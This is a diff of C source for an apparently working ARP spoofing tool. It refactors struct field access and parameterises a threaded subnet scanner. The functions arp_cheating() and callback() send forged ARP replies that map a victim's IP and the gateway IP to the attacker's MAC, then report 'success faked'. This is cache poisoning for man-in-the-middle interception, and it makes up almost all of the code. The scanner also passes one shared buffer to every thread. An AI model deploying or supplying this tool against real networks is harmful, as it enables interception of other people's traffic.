@@ -19,16 +19,16 @@ void arp_request_package(struct frame_arp *frame, unsigned char src_ip[4],
     
     memcpy(frame->fh.dst_mac, broad_mac, 6);
     memcpy(frame->fh.src_mac, src_mac, 6);
-    frame->fh.proto_type = htons(ETH_P_ARP);
+    frame->fh.protocol = htons(ETH_P_ARP);
     frame->ah.ar_hrd = htons(ARPHRD_ETHER);
     frame->ah.ar_pro = htons(ETH_P_IP);
     frame->ah.ar_hln = 6;
     frame->ah.ar_pln = 4;
     frame->ah.ar_op = htons(ARPOP_REQUEST);
-    memcpy(frame->src_mac, src_mac, 6);
-    memcpy(frame->src_ip, src_ip, 4);
+    memcpy(frame->ah.src_mac, src_mac, 6);
+    memcpy(frame->ah.src_ip, src_ip, 4);
     //memset(frame->dst_mac, 0, 6);
-    memcpy(frame->dst_ip, dst_ip, 4); 
+    memcpy(frame->ah.dst_ip, dst_ip, 4); 
 }
 
 /**
@@ -45,16 +45,16 @@ void arp_reply_package(struct frame_arp *frame, unsigned char src_ip[4],
 {  
     memcpy(frame->fh.dst_mac, dst_mac, 6);
     memcpy(frame->fh.src_mac, src_mac, 6);
-    frame->fh.proto_type = htons(ETH_P_ARP);
+    frame->fh.protocol = htons(ETH_P_ARP);
     frame->ah.ar_hrd = htons(ARPHRD_ETHER);
     frame->ah.ar_pro = htons(ETH_P_IP);
     frame->ah.ar_hln = 6;
     frame->ah.ar_pln = 4;
     frame->ah.ar_op = htons(ARPOP_REPLY);
-    memcpy(frame->src_mac, src_mac, 6);
-    memcpy(frame->src_ip, src_ip, 4);
-    memcpy(frame->dst_mac, dst_mac, 6);
-    memcpy(frame->dst_ip, dst_ip, 4); 
+    memcpy(frame->ah.src_mac, src_mac, 6);
+    memcpy(frame->ah.src_ip, src_ip, 4);
+    memcpy(frame->ah.dst_mac, dst_mac, 6);
+    memcpy(frame->ah.dst_ip, dst_ip, 4); 
 }
 
 /**
@@ -120,29 +120,29 @@ static void callback(unsigned char *arg, const struct pcap_pkthdr *head,
     // ------------------------------------arp frame info-------------------------------------------------------
     if(ar_op == 1) printf("arp request\t");
     if(ar_op == 2) printf("arp reply \t");
-    inet_ntop(AF_INET, &old_frame->src_ip, ip_buf, sizeof(ip_buf));
-    printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", old_frame->src_mac[0],old_frame->src_mac[1],old_frame->src_mac[2],
-            old_frame->src_mac[3],old_frame->src_mac[4],old_frame->src_mac[5], ip_buf);
+    inet_ntop(AF_INET, &old_frame->ah.src_ip, ip_buf, sizeof(ip_buf));
+    printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", old_frame->ah.src_mac[0],old_frame->ah.src_mac[1],old_frame->ah.src_mac[2],
+            old_frame->ah.src_mac[3],old_frame->ah.src_mac[4],old_frame->ah.src_mac[5], ip_buf);
     printf("\t->\t");
     memset(ip_buf, 0, sizeof(ip_buf));
-    inet_ntop(AF_INET, &old_frame->dst_ip, ip_buf, sizeof(ip_buf));
-    printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", old_frame->dst_mac[0], old_frame->dst_mac[1], 
-            old_frame->dst_mac[2], old_frame->dst_mac[3], old_frame->dst_mac[4], 
-            old_frame->dst_mac[5], ip_buf);
+    inet_ntop(AF_INET, &old_frame->ah.dst_ip, ip_buf, sizeof(ip_buf));
+    printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", old_frame->ah.dst_mac[0], old_frame->ah.dst_mac[1], 
+            old_frame->ah.dst_mac[2], old_frame->ah.dst_mac[3], old_frame->ah.dst_mac[4], 
+            old_frame->ah.dst_mac[5], ip_buf);
     printf("\n");
 
     // ---------------------------------------------------------------------------------------------
-    if(ar_op == ARPOP_REPLY && (old_frame->src_ip)[3] == info->attack_ip[3] && (old_frame->dst_ip)[3] == info->local_ip[3]) {
+    if(ar_op == ARPOP_REPLY && (old_frame->ah.src_ip)[3] == info->attack_ip[3] && (old_frame->ah.dst_ip)[3] == info->local_ip[3]) {
         //send faked arp reply frame
-        arp_reply_send(info->fd, (struct sockaddr*)&info->addr, info->attack_ip, old_frame->src_mac, 
+        arp_reply_send(info->fd, (struct sockaddr*)&info->addr, info->attack_ip, old_frame->ah.src_mac, 
                         info->gateway_ip, info->local_mac);
         printf("\033[0;35msuccess faked %d.%d.%d.%d\n\033[0m", 
-                (old_frame->src_ip)[0], (old_frame->src_ip)[1],
-                (old_frame->src_ip)[2], (old_frame->src_ip)[3]);
+                (old_frame->ah.src_ip)[0], (old_frame->ah.src_ip)[1],
+                (old_frame->ah.src_ip)[2], (old_frame->ah.src_ip)[3]);
     }
 
-    if((ar_op == ARPOP_REQUEST && (old_frame->src_ip)[3] == info->gateway_ip[3]) ||
-            (ar_op == ARPOP_REQUEST && (old_frame->src_ip)[3] == info->attack_ip[3] && (old_frame->dst_ip)[3] == info->gateway_ip[3]))
+    if((ar_op == ARPOP_REQUEST && (old_frame->ah.src_ip)[3] == info->gateway_ip[3]) ||
+            (ar_op == ARPOP_REQUEST && (old_frame->ah.src_ip)[3] == info->attack_ip[3] && (old_frame->ah.dst_ip)[3] == info->gateway_ip[3]))
     {
         sleep(1);
         arp_request_send(info->fd, (struct sockaddr *)&info->addr, info->attack_ip, info->local_ip, info->local_mac);
@@ -368,24 +368,24 @@ int arp_cheating(char *dstip)
         if (FD_ISSET(fd, &set))
         {
             recvfrom(fd, &recv_buf, sizeof(recv_buf), 0, NULL, NULL);
-            if (ntohs(recv_buf.fh.proto_type) != 0x0806) continue;
+            if (ntohs(recv_buf.fh.protocol) != 0x0806) continue;
             ar_op = ntohs(recv_buf.ah.ar_op);
 
             // ------------------------------------arp frame info-------------------------------------------------------
             if(ar_op == 1) printf("arp request\t");
             if(ar_op == 2) printf("arp reply \t");
-            inet_ntop(AF_INET, &recv_buf.src_ip, ip_buf, sizeof(ip_buf));
-            printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", recv_buf.src_mac[0],recv_buf.src_mac[1],recv_buf.src_mac[2],
-                    recv_buf.src_mac[3],recv_buf.src_mac[4],recv_buf.src_mac[5], ip_buf);
+            inet_ntop(AF_INET, &recv_buf.ah.src_ip, ip_buf, sizeof(ip_buf));
+            printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", recv_buf.ah.src_mac[0],recv_buf.ah.src_mac[1],recv_buf.ah.src_mac[2],
+                    recv_buf.ah.src_mac[3],recv_buf.ah.src_mac[4],recv_buf.ah.src_mac[5], ip_buf);
             printf("\t->\t");
             memset(ip_buf, 0, sizeof(ip_buf));
-            inet_ntop(AF_INET, &recv_buf.dst_ip, ip_buf, sizeof(ip_buf));
-            printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", recv_buf.dst_mac[0], recv_buf.dst_mac[1], 
-                    recv_buf.dst_mac[2], recv_buf.dst_mac[3], recv_buf.dst_mac[4], 
-                    recv_buf.dst_mac[5], ip_buf);
+            inet_ntop(AF_INET, &recv_buf.ah.dst_ip, ip_buf, sizeof(ip_buf));
+            printf("[%02x:%02x:%02x:%02x:%02x:%02x](%s)", recv_buf.ah.dst_mac[0], recv_buf.ah.dst_mac[1], 
+                    recv_buf.ah.dst_mac[2], recv_buf.ah.dst_mac[3], recv_buf.ah.dst_mac[4], 
+                    recv_buf.ah.dst_mac[5], ip_buf);
             printf("\n");
 
-            if (memcmp(recv_buf.src_ip, dst_ip, 4)) {
+            if (memcmp(recv_buf.ah.src_ip, dst_ip, 4)) {
                 arp_request_send(fd, &addr, dst_ip, src_ip, src_mac);
                 printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", 
                         dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3]);
@@ -393,9 +393,9 @@ int arp_cheating(char *dstip)
             }
             if (ar_op == ARPOP_REQUEST)
             {
-                if (!memcmp(recv_buf.src_ip, gw_ip, 4) || 
-                    (!memcmp(recv_buf.src_ip, dst_ip, 4) && 
-                    !memcmp(recv_buf.dst_ip, gw_ip, 4))) 
+                if (!memcmp(recv_buf.ah.src_ip, gw_ip, 4) || 
+                    (!memcmp(recv_buf.ah.src_ip, dst_ip, 4) && 
+                    !memcmp(recv_buf.ah.dst_ip, gw_ip, 4))) 
                 {
                     printf("request\n");
                     sleep(1);
@@ -404,13 +404,13 @@ int arp_cheating(char *dstip)
                             dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3]);
                 }
             } else if (ar_op == ARPOP_REPLY) {
-                if (!memcmp(recv_buf.src_ip, dst_ip, 4) && 
-                    !memcmp(recv_buf.dst_ip, src_ip, 4)) 
+                if (!memcmp(recv_buf.ah.src_ip, dst_ip, 4) && 
+                    !memcmp(recv_buf.ah.dst_ip, src_ip, 4)) 
                 {
-                    arp_reply_send(fd, &addr, dst_ip, recv_buf.src_mac, gw_ip, src_mac);
+                    arp_reply_send(fd, &addr, dst_ip, recv_buf.ah.src_mac, gw_ip, src_mac);
                     printf("\033[0;35msuccess faked %d.%d.%d.%d\n\033[0m", 
-                            (recv_buf.src_ip)[0], (recv_buf.src_ip)[1],
-                            (recv_buf.src_ip)[2], (recv_buf.src_ip)[3]);
+                            (recv_buf.ah.src_ip)[0], (recv_buf.ah.src_ip)[1],
+                            (recv_buf.ah.src_ip)[2], (recv_buf.ah.src_ip)[3]);
                 }
             }
         }
@@ -420,7 +420,7 @@ int arp_cheating(char *dstip)
 }
 
 static int scan_cnt = 0;
-pthread_mutex_t mtx;
+static pthread_mutex_t mtx;
 static void* get_mac(void *arg)
 {
     unsigned char mac[6] = {0};
@@ -451,17 +451,28 @@ static void* get_mac(void *arg)
 /**
  * @brief router_info 
  */
-void router_info()
+void router_info(char *info)
 {
-    pthread_t pt[255];
     int i = 0;
     char ip[20] = {0};
+    char ip_pre[15] = {0};
+    char *p = info;
+    char *point = NULL;
+    pthread_t pt[255];
+
+    if (info == NULL) return;
+    while (*p != '\0') 
+    {
+        if (*p == '.') point = p;
+        p++;
+    }
+    strncpy(ip_pre, info, point - info + 1);
 
     pthread_mutex_init(&mtx, NULL);
     for (i = 1; i <= 255; i++)
     {
 
-        sprintf(ip, "192.168.1.%d", i);
+        sprintf(ip, "%s%d", ip_pre, i);
         pthread_create(&pt[i - 1], NULL, get_mac, (void *)ip);
         usleep(700);
     }
